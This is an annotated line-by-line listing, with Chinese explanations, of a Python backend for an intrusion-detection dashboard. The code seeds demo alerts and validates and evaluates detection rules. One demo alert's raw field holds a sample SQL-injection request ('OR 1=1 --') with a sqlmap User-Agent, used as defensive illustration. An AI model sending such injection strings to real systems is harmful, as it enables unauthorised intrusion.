| 2473 | 函数定义：声明 `_fake_public_ip` 的输入、处理逻辑和返回结果。 | `def _fake_public_ip(rng: random.Random) -> str:` |
| 2474 | 注释：解释下面或当前这段代码的设计意图。 | `    # 避开保留段，随机返回可用作演示的公网 IP 形态` |
| 2475 | 循环：在条件成立期间重复执行逻辑。 | `    while True:` |
| 2476 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `        a = rng.randint(1, 223)` |
| 2477 | 条件判断：满足条件时进入对应分支。 | `        if a in (10, 127, 169, 172, 192, 224, 240):` |
| 2478 | 继续循环：跳过本轮剩余逻辑。 | `            continue` |
| 2479 | 返回结果：把处理后的值交回调用方。 | `        return f"{a}.{rng.randint(0, 255)}.{rng.randint(0, 255)}.{rng.randint(1, 254)}"` |
| 2480 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 2481 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 2482 | 函数定义：声明 `_seed_demo_alerts` 的输入、处理逻辑和返回结果。 | `def _seed_demo_alerts(app: Flask, count: int = 12) -> int:` |
| 2483 | 文档字符串：说明当前模块、类或函数的职责。 | `    """写入 demo 告警并通过 WebSocket 广播。仅开发环境调用。"""` |
| 2484 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `    state: _ServerState = app.extensions["guardian_state"]` |
| 2485 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `    socketio: SocketIO = app.extensions["guardian_socketio"]` |
| 2486 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `    rng = random.Random()` |
| 2487 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `    now = datetime.now(timezone.utc).astimezone()` |
| 2488 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `    created = 0` |
| 2489 | 循环：逐个处理集合或迭代器中的元素。 | `    for _ in range(count):` |
| 2490 | 函数调用：执行已有函数/方法完成当前步骤。 | `        threat_key, title, summary = rng.choice(_DEMO_TYPES)` |
| 2491 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `        level = _weighted_choice(_DEMO_LEVELS, rng)` |
| 2492 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `        src = _fake_public_ip(rng)` |
| 2493 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `        dst = f"10.0.{rng.randint(0, 4)}.{rng.randint(1, 254)}"` |
| 2494 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `        proto = rng.choice(_DEMO_PROTOCOLS)` |
| 2495 | 注释：解释下面或当前这段代码的设计意图。 | `        # 近 24h 内随机时间` |
| 2496 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `        ts = (now - timedelta(minutes=rng.randint(0, 1440))).isoformat(timespec="seconds")` |
| 2497 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `        confidence = round(rng.uniform(0.55, 0.99), 3)` |
| 2498 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `        alert = {` |
| 2499 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `            "id": _uuid(),` |
| 2500 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `            "timestamp": ts,` |
| 2501 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `            "level": level,` |
| 2502 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `            "status": "open",` |
| 2503 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `            "threat_type": threat_key,` |
| 2504 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `            "title": title,` |
| 2505 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `            "summary": f"{summary}（来源 {src}）",` |
| 2506 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `            "source_ip": src,` |
| 2507 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `            "source_port": rng.randint(1024, 65535),` |
| 2508 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `            "dest_ip": dst,` |
| 2509 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `            "dest_port": rng.choice([22, 80, 443, 3306, 3389, 8080]),` |
| 2510 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `            "protocol": proto,` |
| 2511 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `            "confidence": confidence,` |
| 2512 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `            "model_version": "v1",` |
| 2513 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `            "recommended_action": "block" if level in ("high", "critical") else "monitor",` |
| 2514 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `            "features": {` |
| 2515 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `                "packets_per_sec": rng.randint(10, 5000),` |
| 2516 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `                "avg_packet_size": rng.randint(40, 1500),` |
| 2517 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `                "unique_ports": rng.randint(1, 120),` |
| 2518 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `                "failed_ratio": round(rng.uniform(0.0, 0.98), 2),` |
| 2519 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `                "payload_entropy": round(rng.uniform(2.0, 7.9), 2),` |
| 2520 | 代码语句：参与当前文件的业务流程或数据处理。 | `            },` |
| 2521 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `            "indicators": [` |
| 2522 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `                f"src={src}",` |
| 2523 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `                f"proto={proto}",` |
| 2524 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `                f"model_version=v1 confidence={confidence}",` |
| 2525 | 代码语句：参与当前文件的业务流程或数据处理。 | `            ],` |
| 2526 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `            "explanation": (` |
| 2527 | 代码语句：参与当前文件的业务流程或数据处理。 | `                f"模型在 {proto} 流量上检测到 {title}。"` |
| 2528 | 函数调用：执行已有函数/方法完成当前步骤。 | `                f"关键特征：包速率偏离基线 > 3σ；载荷熵 {round(rng.uniform(3.0, 7.5), 2)}；"` |
| 2529 | 函数调用：执行已有函数/方法完成当前步骤。 | `                f"来源 IP 在近 1 小时出现 {rng.randint(3, 120)} 次。"` |
| 2530 | 代码语句：参与当前文件的业务流程或数据处理。 | `            ),` |
| 2531 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `            "raw": (` |
| 2532 | 函数调用：执行已有函数/方法完成当前步骤。 | `                f"{proto} {src}:{rng.randint(1024, 65535)} -> {dst}:{rng.choice([80, 443])}\n"` |
| 2533 | 代码语句：参与当前文件的业务流程或数据处理。 | `                f"GET /admin?q=' OR 1=1 -- HTTP/1.1\n"` |
| 2534 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `                f"User-Agent: sqlmap/1.7.2\n"` |
| 2535 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `                f"Host: {dst}\n"` |
| 2536 | 代码语句：参与当前文件的业务流程或数据处理。 | `            ),` |
| 2537 | 代码语句：参与当前文件的业务流程或数据处理。 | `        }` |
| 2538 | 上下文管理：自动管理资源打开与释放。 | `        with app.app_context():` |
| 2539 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `            row = _upsert_alert_to_db(alert)` |
| 2540 | 条件判断：满足条件时进入对应分支。 | `        if row is None:` |
| 2541 | 继续循环：跳过本轮剩余逻辑。 | `            continue` |
| 2542 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `        api_dict = _alert_to_api_dict(row)` |
| 2543 | 函数调用：执行已有函数/方法完成当前步骤。 | `        state.add_alert(api_dict)` |
| 2544 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `        state.stats["total_threats"] = state.stats.get("total_threats", 0) + 1` |
| 2545 | 异常保护：尝试执行可能失败的逻辑。 | `        try:` |
| 2546 | 函数调用：执行已有函数/方法完成当前步骤。 | `            socketio.emit("alert", api_dict)` |
| 2547 | 异常处理：捕获错误并执行降级或记录逻辑。 | `        except Exception:  # noqa: BLE001` |
| 2548 | 日志记录：输出运行状态、调试信息或异常线索。 | `            logger.debug("alert 广播失败", exc_info=True)` |
| 2549 | 代码语句：参与当前文件的业务流程或数据处理。 | `        created += 1` |
| 2550 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `    state.stats["updated_at"] = _now_iso()` |
| 2551 | 返回结果：把处理后的值交回调用方。 | `    return created` |
| 2552 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 2553 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 2554 | 注释：解释下面或当前这段代码的设计意图。 | `# =====================================================================` |
| 2555 | 注释：解释下面或当前这段代码的设计意图。 | `# 检测规则：校验 / 测试引擎 / 演示种子` |
| 2556 | 注释：解释下面或当前这段代码的设计意图。 | `# =====================================================================` |
| 2557 | 注释：解释下面或当前这段代码的设计意图。 | `# 允许用于 threshold 表达式的特征名（白名单）` |
| 2558 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `_RULE_FEATURE_KEYS: Tuple[str, ...] = (` |
| 2559 | 代码语句：参与当前文件的业务流程或数据处理。 | `    "packets_per_sec",` |
| 2560 | 代码语句：参与当前文件的业务流程或数据处理。 | `    "avg_packet_size",` |
| 2561 | 代码语句：参与当前文件的业务流程或数据处理。 | `    "unique_ports",` |
| 2562 | 代码语句：参与当前文件的业务流程或数据处理。 | `    "failed_ratio",` |
| 2563 | 代码语句：参与当前文件的业务流程或数据处理。 | `    "payload_entropy",` |
| 2564 | 代码语句：参与当前文件的业务流程或数据处理。 | `    "confidence",` |
| 2565 | 函数调用：执行已有函数/方法完成当前步骤。 | `)` |
| 2566 | 注释：解释下面或当前这段代码的设计意图。 | `# threshold 规则表达式：\`<feature> <op> <number>\`；仅允许上述白名单 + 有限操作符` |
| 2567 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `_RULE_THRESHOLD_RE = re.compile(` |
| 2568 | 函数调用：执行已有函数/方法完成当前步骤。 | `    r"^\s*(?P<key>[a-zA-Z_][a-zA-Z0-9_]*)\s*(?P<op>>=\|<=\|>\|<\|==\|!=)\s*(?P<val>-?\d+(?:\.\d+)?)\s*$"` |
| 2569 | 函数调用：执行已有函数/方法完成当前步骤。 | `)` |
| 2570 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 2571 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 2572 | 函数定义：声明 `_validate_rule_payload` 的输入、处理逻辑和返回结果。 | `def _validate_rule_payload(` |
| 2573 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `    payload: Dict[str, Any], *, partial: bool = False` |
| 2574 | 代码语句：参与当前文件的业务流程或数据处理。 | `) -> Tuple[Optional[Dict[str, Any]], Optional[str]]:` |
| 2575 | 文档字符串：说明当前模块、类或函数的职责。 | `    """规范化 / 校验规则入参。partial=True 用于 PUT 合并语义。` |
| 2576 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 2577 | 函数调用：执行已有函数/方法完成当前步骤。 | `    返回 (normalized, error)；任一成功则另一为 None。` |
| 2578 | 文档字符串边界：开始或结束模块/类/函数说明。 | `    """` |
| 2579 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `    result: Dict[str, Any] = {}` |
| 2580 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 2581 | 注释：解释下面或当前这段代码的设计意图。 | `    # 必填字段（完整创建时）` |
| 2582 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `    required = ("name", "type", "pattern", "action", "level")` |
| 2583 | 条件判断：满足条件时进入对应分支。 | `    if not partial:` |
| 2584 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `        missing = [k for k in required if not str(payload.get(k, "")).strip()]` |
| 2585 | 条件判断：满足条件时进入对应分支。 | `        if missing:` |
| 2586 | 返回结果：把处理后的值交回调用方。 | `            return None, f"缺少必填字段：{', '.join(missing)}"` |
| 2587 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 2588 | 条件判断：满足条件时进入对应分支。 | `    if "name" in payload:` |
| 2589 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `        name = str(payload.get("name", "")).strip()` |
| 2590 | 条件判断：满足条件时进入对应分支。 | `        if not name or len(name) > _RULE_NAME_MAX:` |
| 2591 | 返回结果：把处理后的值交回调用方。 | `            return None, f"name 必填且长度 <= {_RULE_NAME_MAX}"` |
| 2592 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `        result["name"] = name` |
| 2593 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 2594 | 条件判断：满足条件时进入对应分支。 | `    if "type" in payload:` |
| 2595 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `        rtype = str(payload.get("type", "")).strip()` |
| 2596 | 条件判断：满足条件时进入对应分支。 | `        if rtype not in RULE_TYPES:` |
| 2597 | 返回结果：把处理后的值交回调用方。 | `            return None, f"type 必须是 {RULE_TYPES}"` |
| 2598 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `        result["type"] = rtype` |
| 2599 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 2600 | 条件判断：满足条件时进入对应分支。 | `    if "pattern" in payload:` |
| 2601 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `        pattern = str(payload.get("pattern", ""))` |
| 2602 | 条件判断：满足条件时进入对应分支。 | `        if len(pattern) > _RULE_PATTERN_MAX:` |
| 2603 | 返回结果：把处理后的值交回调用方。 | `            return None, f"pattern 长度不得超过 {_RULE_PATTERN_MAX} 字符"` |
| 2604 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `        result["pattern"] = pattern` |
| 2605 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 2606 | 条件判断：满足条件时进入对应分支。 | `    if "action" in payload:` |
| 2607 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `        action = str(payload.get("action", "")).strip()` |
| 2608 | 条件判断：满足条件时进入对应分支。 | `        if action not in RULE_ACTIONS:` |
| 2609 | 返回结果：把处理后的值交回调用方。 | `            return None, f"action 必须是 {RULE_ACTIONS}"` |
| 2610 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `        result["action"] = action` |
| 2611 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 2612 | 条件判断：满足条件时进入对应分支。 | `    if "level" in payload:` |
| 2613 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `        level = str(payload.get("level", "")).strip()` |
| 2614 | 条件判断：满足条件时进入对应分支。 | `        if level not in ALERT_LEVELS:` |
| 2615 | 返回结果：把处理后的值交回调用方。 | `            return None, f"level 必须是 {ALERT_LEVELS}"` |
| 2616 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `        result["level"] = level` |
| 2617 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 2618 | 条件判断：满足条件时进入对应分支。 | `    if "priority" in payload:` |
| 2619 | 异常保护：尝试执行可能失败的逻辑。 | `        try:` |
| 2620 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `            prio = int(payload.get("priority"))` |
| 2621 | 异常处理：捕获错误并执行降级或记录逻辑。 | `        except (TypeError, ValueError):` |
| 2622 | 返回结果：把处理后的值交回调用方。 | `            return None, "priority 必须是整数（1~999）"` |
| 2623 | 条件判断：满足条件时进入对应分支。 | `        if prio < 1 or prio > 999:` |
| 2624 | 返回结果：把处理后的值交回调用方。 | `            return None, "priority 必须在 1~999"` |
| 2625 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `        result["priority"] = prio` |
| 2626 | 条件分支：前面条件不满足时继续判断。 | `    elif not partial:` |
| 2627 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `        result["priority"] = 100` |
| 2628 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 2629 | 条件判断：满足条件时进入对应分支。 | `    if "enabled" in payload:` |
| 2630 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `        result["enabled"] = bool(payload.get("enabled"))` |
| 2631 | 条件分支：前面条件不满足时继续判断。 | `    elif not partial:` |
| 2632 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `        result["enabled"] = True` |
| 2633 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 2634 | 条件判断：满足条件时进入对应分支。 | `    if "description" in payload:` |
| 2635 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `        desc = str(payload.get("description", ""))` |
| 2636 | 条件判断：满足条件时进入对应分支。 | `        if len(desc) > _RULE_DESC_MAX:` |
| 2637 | 返回结果：把处理后的值交回调用方。 | `            return None, f"description 长度不得超过 {_RULE_DESC_MAX} 字符"` |
| 2638 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `        result["description"] = desc` |
| 2639 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 2640 | 注释：解释下面或当前这段代码的设计意图。 | `    # 对 pattern 做类型相关的结构校验` |
| 2641 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `    effective_type = result.get("type") or (` |
| 2642 | 函数调用：执行已有函数/方法完成当前步骤。 | `        payload.get("type") if partial else None` |
| 2643 | 函数调用：执行已有函数/方法完成当前步骤。 | `    )` |
| 2644 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `    effective_pattern = result.get("pattern")` |
| 2645 | 条件判断：满足条件时进入对应分支。 | `    if effective_pattern is not None and effective_type:` |
| 2646 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `        err = _validate_rule_pattern(effective_type, effective_pattern)` |
| 2647 | 条件判断：满足条件时进入对应分支。 | `        if err:` |
| 2648 | 返回结果：把处理后的值交回调用方。 | `            return None, err` |
| 2649 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 2650 | 返回结果：把处理后的值交回调用方。 | `    return result, None` |
| 2651 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 2652 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 2653 | 函数定义：声明 `_validate_rule_pattern` 的输入、处理逻辑和返回结果。 | `def _validate_rule_pattern(rule_type: str, pattern: str) -> Optional[str]:` |
| 2654 | 文档字符串：说明当前模块、类或函数的职责。 | `    """根据规则类型对 pattern 做结构校验，返回错误字符串或 None。"""` |
| 2655 | 条件判断：满足条件时进入对应分支。 | `    if rule_type == "signature":` |
| 2656 | 条件判断：满足条件时进入对应分支。 | `        if not pattern.strip():` |
| 2657 | 返回结果：把处理后的值交回调用方。 | `            return "signature 规则需要非空的匹配串"` |
| 2658 | 注释：解释下面或当前这段代码的设计意图。 | `        # 避免提交可编译为昂贵回溯的正则：只允许普通字符串或前后斜杠包裹的小正则` |
| 2659 | 条件判断：满足条件时进入对应分支。 | `        if pattern.startswith("/") and pattern.endswith("/") and len(pattern) > 1:` |
| 2660 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `            body = pattern[1:-1]` |
| 2661 | 异常保护：尝试执行可能失败的逻辑。 | `            try:` |
| 2662 | 函数调用：执行已有函数/方法完成当前步骤。 | `                re.compile(body)` |
| 2663 | 异常处理：捕获错误并执行降级或记录逻辑。 | `            except re.error as exc:` |
| 2664 | 返回结果：把处理后的值交回调用方。 | `                return f"signature 正则无效：{exc}"` |
| 2665 | 返回结果：把处理后的值交回调用方。 | `        return None` |
| 2666 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 2667 | 条件判断：满足条件时进入对应分支。 | `    if rule_type == "threshold":` |
| 2668 | 条件判断：满足条件时进入对应分支。 | `        if not _RULE_THRESHOLD_RE.match(pattern):` |
| 2669 | 返回结果：把处理后的值交回调用方。 | `            return (` |
| 2670 | 代码语句：参与当前文件的业务流程或数据处理。 | `                "threshold 规则格式：'<feature> <op> <number>'；"` |
| 2671 | 代码语句：参与当前文件的业务流程或数据处理。 | `                f"feature 允许 {_RULE_FEATURE_KEYS}，op ∈ >,>=,<,<=,==,!="` |
| 2672 | 函数调用：执行已有函数/方法完成当前步骤。 | `            )` |
| 2673 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `        m = _RULE_THRESHOLD_RE.match(pattern)` |
| 2674 | 条件判断：满足条件时进入对应分支。 | `        if m and m.group("key") not in _RULE_FEATURE_KEYS:` |
| 2675 | 返回结果：把处理后的值交回调用方。 | `            return f"threshold 只允许特征：{_RULE_FEATURE_KEYS}"` |
| 2676 | 返回结果：把处理后的值交回调用方。 | `        return None` |
| 2677 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 2678 | 条件判断：满足条件时进入对应分支。 | `    if rule_type == "anomaly":` |
| 2679 | 条件判断：满足条件时进入对应分支。 | `        if not pattern.strip():` |
| 2680 | 返回结果：把处理后的值交回调用方。 | `            return "anomaly 规则需要声明关注的特征列表（逗号分隔）"` |
| 2681 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `        keys = [k.strip() for k in pattern.split(",") if k.strip()]` |
| 2682 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `        bad = [k for k in keys if k not in _RULE_FEATURE_KEYS]` |
| 2683 | 条件判断：满足条件时进入对应分支。 | `        if bad:` |
| 2684 | 返回结果：把处理后的值交回调用方。 | `            return f"anomaly 仅允许特征：{_RULE_FEATURE_KEYS}；无效：{bad}"` |
| 2685 | 返回结果：把处理后的值交回调用方。 | `        return None` |
| 2686 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 2687 | 返回结果：把处理后的值交回调用方。 | `    return None` |
| 2688 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 2689 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 2690 | 函数定义：声明 `_evaluate_rule` 的输入、处理逻辑和返回结果。 | `def _evaluate_rule(` |
| 2691 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `    rule: Dict[str, Any], sample: Dict[str, Any]` |
| 2692 | 代码语句：参与当前文件的业务流程或数据处理。 | `) -> Dict[str, Any]:` |
| 2693 | 文档字符串：说明当前模块、类或函数的职责。 | `    """对给定样本评估规则命中情况。` |
| 2694 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 2695 | 代码语句：参与当前文件的业务流程或数据处理。 | `    样本字段（可选）：` |
| 2696 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `        payload: str   —— 用于 signature 匹配` |
| 2697 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `        src_ip: str    —— 用于在 reason 中回显` |
| 2698 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `        features: dict —— 用于 threshold / anomaly（数值）` |
| 2699 | 文档字符串边界：开始或结束模块/类/函数说明。 | `    """` |
| 2700 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `    rule_type = rule.get("type")` |
| 2701 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `    pattern = str(rule.get("pattern", ""))` |
| 2702 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `    payload = str(sample.get("payload", ""))` |
| 2703 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `    features = sample.get("features") or {}` |
| 2704 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `    matched = False` |
| 2705 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `    reason = ""` |
| 2706 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 2707 | 条件判断：满足条件时进入对应分支。 | `    if rule_type == "signature":` |
| 2708 | 条件判断：满足条件时进入对应分支。 | `        if pattern.startswith("/") and pattern.endswith("/") and len(pattern) > 1:` |
| 2709 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `            body = pattern[1:-1]` |
| 2710 | 异常保护：尝试执行可能失败的逻辑。 | `            try:` |
| 2711 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `                matched = bool(re.search(body, payload))` |
| 2712 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `                reason = (` |
| 2713 | 代码语句：参与当前文件的业务流程或数据处理。 | `                    f"正则 {pattern} 在 payload 中匹配"` |
| 2714 | 条件判断：满足条件时进入对应分支。 | `                    if matched` |
| 2715 | 兜底分支：处理前面条件都不满足的情况。 | `                    else f"正则 {pattern} 未命中 payload"` |
| 2716 | 函数调用：执行已有函数/方法完成当前步骤。 | `                )` |
| 2717 | 异常处理：捕获错误并执行降级或记录逻辑。 | `            except re.error as exc:` |
| 2718 | 返回结果：把处理后的值交回调用方。 | `                return {` |
| 2719 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `                    "matched": False,` |
| 2720 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `                    "reason": f"正则编译失败：{exc}",` |
| 2721 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `                    "rule_type": rule_type,` |
| 2722 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `                    "evaluated_at": _now_iso(),` |
| 2723 | 代码语句：参与当前文件的业务流程或数据处理。 | `                }` |
| 2724 | 兜底分支：处理前面条件都不满足的情况。 | `        else:` |
| 2725 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `            matched = pattern in payload` |
| 2726 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `            reason = (` |
| 2727 | 代码语句：参与当前文件的业务流程或数据处理。 | `                f"payload 包含子串 '{pattern}'"` |
| 2728 | 条件判断：满足条件时进入对应分支。 | `                if matched` |
| 2729 | 兜底分支：处理前面条件都不满足的情况。 | `                else f"payload 中未出现 '{pattern}'"` |
| 2730 | 函数调用：执行已有函数/方法完成当前步骤。 | `            )` |
| 2731 | 条件分支：前面条件不满足时继续判断。 | `    elif rule_type == "threshold":` |
| 2732 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `        m = _RULE_THRESHOLD_RE.match(pattern)` |
| 2733 | 条件判断：满足条件时进入对应分支。 | `        if not m:` |
| 2734 | 返回结果：把处理后的值交回调用方。 | `            return {` |
| 2735 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `                "matched": False,` |
| 2736 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `                "reason": "threshold pattern 格式非法",` |
| 2737 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `                "rule_type": rule_type,` |
| 2738 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `                "evaluated_at": _now_iso(),` |
| 2739 | 代码语句：参与当前文件的业务流程或数据处理。 | `            }` |
| 2740 | 函数调用：执行已有函数/方法完成当前步骤。 | `        key, op, raw_val = m.group("key"), m.group("op"), m.group("val")` |
| 2741 | 条件判断：满足条件时进入对应分支。 | `        if key not in _RULE_FEATURE_KEYS:` |
| 2742 | 返回结果：把处理后的值交回调用方。 | `            return {` |
| 2743 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `                "matched": False,` |
| 2744 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `                "reason": f"特征 {key} 不在白名单",` |
| 2745 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `                "rule_type": rule_type,` |
| 2746 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `                "evaluated_at": _now_iso(),` |
| 2747 | 代码语句：参与当前文件的业务流程或数据处理。 | `            }` |
| 2748 | 条件判断：满足条件时进入对应分支。 | `        if key not in features:` |
| 2749 | 返回结果：把处理后的值交回调用方。 | `            return {` |
| 2750 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `                "matched": False,` |
| 2751 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `                "reason": f"sample.features 缺少特征 {key}",` |
| 2752 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `                "rule_type": rule_type,` |
| 2753 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `                "evaluated_at": _now_iso(),` |
| 2754 | 代码语句：参与当前文件的业务流程或数据处理。 | `            }` |
| 2755 | 异常保护：尝试执行可能失败的逻辑。 | `        try:` |
| 2756 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `            left = float(features[key])` |
| 2757 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `            right = float(raw_val)` |
| 2758 | 异常处理：捕获错误并执行降级或记录逻辑。 | `        except (TypeError, ValueError):` |
| 2759 | 返回结果：把处理后的值交回调用方。 | `            return {` |
| 2760 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `                "matched": False,` |
| 2761 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `                "reason": f"特征 {key} 或阈值 {raw_val} 非数值",` |
| 2762 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `                "rule_type": rule_type,` |
| 2763 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `                "evaluated_at": _now_iso(),` |
| 2764 | 代码语句：参与当前文件的业务流程或数据处理。 | `            }` |
